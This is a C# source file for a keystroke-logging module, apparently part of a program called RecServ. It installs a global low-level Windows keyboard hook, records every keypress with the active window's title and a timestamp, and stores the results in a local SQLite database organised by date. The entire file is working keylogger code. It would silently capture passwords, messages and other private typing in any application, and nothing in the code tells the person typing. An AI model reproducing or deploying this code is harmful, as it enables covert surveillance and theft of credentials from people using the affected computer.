using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using Microsoft.Data.Sqlite;
using RecServ.Global_Classes;

namespace RecServ.Modules
{
    public class Keystrokes : IDisposable
    {

        public void Start()
        {
            PathManager.Instance.CheckFolder(PathManager.Instance.Database);
            _hookID = SetHook(_proc);
            PrevActiveWin = GetActiveWindowTitle();
            BufferData.Clear();
            BufferData.Append("<!-" + DateTime.Now.ToString("hh:mm tt") + "-!>\r\n<@-" + GetActiveWindowTitle() + "-@>\r\n<:-");
        }

        public void Stop()
        {

            BufferData.Append(("-:>\r\n"));
            SaveToDatabase();
            UnhookWindowsHookEx(_hookID);

            Dispose();
        }


        #region > Constants and Other Initializers

        //File Paths:
        private static readonly string KeystrokesDB = $@"{PathManager.Instance.Database}\KeystrokesDB";


        //For Getting Icons: {Code Temporary removed}
        private const int GCL_HICON = -14;
        private const int ICON_SMALL = 0;
        private const int ICON_BIG = 1;

        //For Getting Keyboard Inputs:
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_SYSKEYUP = 0x0105;

        private static string PrevActiveWin = "ActWin";
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static readonly LowLevelKeyboardProc _proc = CaptureKeystrokes;
        private static IntPtr _hookID = IntPtr.Zero;
        private static readonly HashSet<Keys> _pressedKeys = new HashSet<Keys>();

        private static StringBuilder BufferData = new StringBuilder();


        //These keys will be only captured once even if held Down
        private const string ShiftKeyText = "";
        private const string ControlKeyText = "";
        private const string WinKeyText = "[Win]";
        private const string AltKeyText = "";
        private const string EscapeKeyText = "[Esc]";
        private const string CapsOnText = "[CapsON]";
        private const string CapsOffText = "[CapsOFF]";
        //private const string Enter = "[Enter]";
        //private const string Return = "[Return]";

        #endregion

#region > Other Supportive Methods:

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static string GetActiveWindowTitle()
        {
            IntPtr hWnd = GetForegroundWindow();


            if (hWnd == IntPtr.Zero)
            {
                return "Unknown App";
            }

            StringBuilder title = new StringBuilder(256);
            int length = GetWindowText(hWnd, title, title.Capacity);

            if (length > 0)
            {
                return title.ToString();
            }

            return "Unknown";
        }

        //Checks if Entered key is a Special Key
        private static bool IsSpecialKey(Keys key)
        {
            return
                key == Keys.LShiftKey ||
                key == Keys.RShiftKey ||
                key == Keys.LControlKey ||
                key == Keys.RControlKey ||
                key == Keys.LMenu ||
                key == Keys.RMenu ||
                key == Keys.CapsLock ||
                key == Keys.Escape ||
                key == Keys.LWin ||
                key == Keys.RWin ||
                key == Keys.Enter ||
                key == Keys.Return;
        }

        #endregion

#region > Main Methods:

        //Captures Data Using Hook
        private static IntPtr CaptureKeystrokes(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                var key = (Keys)vkCode;
                bool isShiftDown = (Control.ModifierKeys & Keys.Shift) != 0;
                bool isControlDown = (Control.ModifierKeys & Keys.Control) != 0;
                bool isAltDown = (Control.ModifierKeys & Keys.Alt) != 0;
                bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
                bool isLetter = key >= Keys.A && key <= Keys.Z;
                bool isUppercase = (isShiftDown && !isCapsLockOn) || (!isShiftDown && isCapsLockOn);

                if (!PrevActiveWin.Contains(GetActiveWindowTitle())) //Runs when active window changes
                {
                    string currentTime = DateTime.Now.ToString("hh:mm tt");

                    BufferData.Append("-:>\r\n\r\n");
                    SaveToDatabase();
                    BufferData.Clear();
                    string WriteData = "<!-" + currentTime + "-!>\r\n<@-" + GetActiveWindowTitle() + "-@>\r\n<:-";
                    BufferData.Append(WriteData);
                    PrevActiveWin = GetActiveWindowTitle();
                }

                string keyName;

                if (isLetter && !isUppercase)
                {
                    keyName = key.ToString().ToLower();
                }

                else if (isShiftDown)
                {
                    switch (key)
                    {
                        case Keys.D1: keyName = "!"; break;
                        case Keys.D2: keyName = "@"; break;
                        case Keys.D3: keyName = "#"; break;
                        case Keys.D4: keyName = "$"; break;
                        case Keys.D5: keyName = "%"; break;
                        case Keys.D6: keyName = "^"; break;
                        case Keys.D7: keyName = "&"; break;
                        case Keys.D8: keyName = "*"; break;
                        case Keys.D9: keyName = "("; break;
                        case Keys.D0: keyName = ")"; break;

                        case Keys.OemMinus: keyName = "_"; break;
                        case Keys.Oemplus: keyName = "+"; break;
                        case Keys.OemOpenBrackets: keyName = "{"; break;
                        case Keys.Oem6: keyName = "}"; break;
                        case Keys.Oem1: keyName = ":"; break;
                        case Keys.Oem7: keyName = "\""; break;
                        case Keys.Oem5: keyName = "|"; break;
                        case Keys.Oemcomma: keyName = "<"; break;
                        case Keys.OemPeriod: keyName = ">"; break;
                        case Keys.OemQuestion: keyName = "?"; break;
                        case Keys.Oemtilde: keyName = "~"; break;
                        case Keys.OemBackslash: keyName = "|"; break;

                        case Keys.Space: keyName = " "; break;
                        case Keys.Back: keyName = "[Back]"; break;
                        case Keys.Tab: keyName = "[Tab]"; break;

                        case Keys.Left: keyName = "[Left]"; break;
                        case Keys.Up: keyName = "[Up]"; break;
                        case Keys.Right: keyName = "[Right]"; break;
                        case Keys.Down: keyName = "[Down]"; break;

                        default: keyName = key.ToString(); break;
                    }
                }

                else if (!isShiftDown)
                {
                    switch (key)
                    {
                        case Keys.D1: keyName = "1"; break;
                        case Keys.D2: keyName = "2"; break;
                        case Keys.D3: keyName = "3"; break;
                        case Keys.D4: keyName = "4"; break;
                        case Keys.D5: keyName = "5"; break;
                        case Keys.D6: keyName = "6"; break;
                        case Keys.D7: keyName = "7"; break;
                        case Keys.D8: keyName = "8"; break;
                        case Keys.D9: keyName = "9"; break;
                        case Keys.D0: keyName = "0"; break;

                        case Keys.OemMinus: keyName = "-"; break;
                        case Keys.Oemplus: keyName = "="; break;
                        case Keys.OemOpenBrackets: keyName = "["; break;
                        case Keys.Oem6: keyName = "]"; break;
                        case Keys.Oem1: keyName = ";"; break;
                        case Keys.Oem7: keyName = "\'"; break;
                        case Keys.Oem5: keyName = "\\"; break;
                        case Keys.Oemcomma: keyName = ","; break;
                        case Keys.OemPeriod: keyName = "."; break;
                        case Keys.OemQuestion: keyName = "/"; break;
                        case Keys.Oemtilde: keyName = "`"; break;
                        case Keys.OemBackslash: keyName = "\\"; break;

                        case Keys.Space: keyName = " "; break;
                        case Keys.Back: keyName = "[Back]"; break;
                        case Keys.Tab: keyName = "[Tab]"; break;

                        case Keys.Left: keyName = "[Left]"; break;
                        case Keys.Up: keyName = "[Up]"; break;
                        case Keys.Right: keyName = "[Right]"; break;
                        case Keys.Down: keyName = "[Down]"; break;

                        default: keyName = key.ToString(); break;
                    }
                }

                else
                {
                    keyName = key.ToString();
                }

                if (IsSpecialKey(key))
                {

                    if (!_pressedKeys.Contains(key))
                    {
                        _pressedKeys.Add(key);

                        switch (key)
                        {
                            case Keys.LShiftKey:
                            case Keys.RShiftKey:
                                BufferData.Append(ShiftKeyText);
                                break;

                            case Keys.LControlKey:
                            case Keys.RControlKey:
                                BufferData.Append(ControlKeyText);

                                break;

                            case Keys.LMenu:
                            case Keys.RMenu:
                                BufferData.Append(AltKeyText);
                                break;

                            case Keys.LWin:
                            case Keys.RWin:
                                BufferData.Append(WinKeyText);
                                break;

                            case Keys.Escape:
                                BufferData.Append(EscapeKeyText);
                                break;

                            case Keys.CapsLock:
                                BufferData.Append((isCapsLockOn ? CapsOffText : CapsOnText));
                                break;

                            default:
                                BufferData.Append(($"[{keyName}]"));
                                break;
                        }
                    }
                }

                else
                {
                    _pressedKeys.Remove(key);
                    if (isControlDown)
                    {
                        BufferData.Append(($"[Ctrl + {keyName.ToUpper()}]"));
                    }
                    else if (isAltDown)
                    {
                        BufferData.Append(("[Alt + " + keyName.ToUpper() + "]"));
                    }
                    else
                    {
                        BufferData.Append((keyName));
                    }
                }
            }

            else if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                var key = (Keys)vkCode;
                _pressedKeys.Remove(key);
            }


            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }


        //Saves The Captured Data to SqLite Database
        private static void SaveToDatabase()
        {
            //Gets Data from BufferData, Extracts data according to pattern and adds extrated Data to respactive List
            string TheText = BufferData.ToString();

            List<string> timeList = Regex.Matches(TheText, @"<!-(.*?)-!>").Cast<Match>()
                .Select(match => string.IsNullOrEmpty(match.Groups[1].Value) ? "Unknown Time" : match.Groups[1].Value).ToList();

            List<string> titleList = Regex.Matches(TheText, @"<@-(.*?)-@>").Cast<Match>()
                .Select(match => string.IsNullOrEmpty(match.Groups[1].Value) ? "Unknown Title" : match.Groups[1].Value).ToList();

            List<string> contentList = Regex.Matches(TheText, @"<:-(.*?)-:>").Cast<Match>()
                .Select(match => string.IsNullOrEmpty(match.Groups[1].Value) ? "<No Data Found>" : match.Groups[1].Value).ToList();

            //Adds Data from All three lists to Database
            if (timeList.Count == titleList.Count && titleList.Count == contentList.Count)
            {
                using (var connection = new SqliteConnection($"Data Source={KeystrokesDB};"))
                {
                    var CurrentDBTable = $"{DateTimeOffset.Now.Day}-{DateTimeOffset.Now.Month}-{DateTimeOffset.Now.Year}";

                    connection.Open();
                    using (var command = new SqliteCommand($"CREATE TABLE IF NOT EXISTS '{CurrentDBTable}' (Title TEXT, Content TEXT, Time TEXT)", connection))
                    {
                        command.ExecuteNonQuery();
                    }

                    for (int i = 0; i < timeList.Count; i++)
                    {
                        using (var command = new SqliteCommand($"INSERT INTO '{CurrentDBTable}' (Title, Content, Time) VALUES (@Title, @Content, @Time)", connection))
                        {
                            command.Parameters.AddWithValue("@Title", titleList[i]);
                            command.Parameters.AddWithValue("@Content", contentList[i]);
                            command.Parameters.AddWithValue("@Time", timeList[i]);

                            command.ExecuteNonQuery();
                        }
                    }
                    connection.Close();
                }
            }
        }


        public void Dispose()
        {
            // Dispose any disposable objects here


            using (var connection = new SqliteConnection($"Data Source={KeystrokesDB}"))
            {
                connection.Close();
            }

            UnhookWindowsHookEx(_hookID);
        }



        #endregion

        #region > Required DLL Files:

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)] //Used to get Icon of Active Window
        private static extern int GetClassLong(IntPtr hWnd, int nIndex, out IntPtr hIcon);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        #endregion

    }
}
